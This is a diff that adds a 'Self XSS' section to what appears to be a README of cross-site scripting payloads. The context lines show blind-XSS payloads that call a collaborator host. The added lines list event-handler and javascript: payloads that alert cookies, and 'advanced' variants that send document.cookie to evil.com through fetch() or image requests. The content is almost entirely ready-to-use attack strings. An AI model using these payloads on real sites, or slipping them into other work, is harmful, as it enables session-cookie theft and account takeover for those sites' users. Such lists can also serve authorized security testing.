@@ -214,4 +214,33 @@ This repository features payloads for the following XSS attack types:
 - `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
 - `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`
 
+---
 
+# Self XSS Payloads
+
+
+### Common Self XSS Payloads
+- `javascript:alert(document.cookie)`
+- `<img src=x onerror=alert(document.cookie)>`
+- `<svg onload=alert(document.cookie)>`
+- `<iframe src="javascript:alert(document.cookie)"></iframe>`
+- `<body onload="alert(document.cookie)">`
+- `<a href="javascript:alert(document.cookie)">Click me</a>`
+- `<input value="" onfocus="alert(document.cookie)">`
+- `<div onmouseover="alert(document.cookie)">Hover me</div>`
+- `<img src=x onerror="console.log(document.cookie)">`
+- `<svg onload="console.log(document.cookie)">`
+
+### Advanced Self XSS Techniques
+- `javascript:fetch('https://evil.com?cookie='+document.cookie)`
+- `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
+- `<iframe src="javascript:fetch('https://evil.com?cookie='+document.cookie)"></iframe>`
+- `<svg onload="fetch('https://evil.com?cookie='+document.cookie)">`
+- `<body onload="fetch('https://evil.com?cookie='+document.cookie)">`
+- `<a href="javascript:fetch('https://evil.com?cookie='+document.cookie)">Click me</a>`
+- `<input value="" onfocus="fetch('https://evil.com?cookie='+document.cookie)">`
+- `<div onmouseover="fetch('https://evil.com?cookie='+document.cookie)">Hover me</div>`
+- `<img src=x onerror="new Image().src='https://evil.com?cookie='+document.cookie">`
+- `<svg onload="new Image().src='https://evil.com?cookie='+document.cookie">`
+
+---
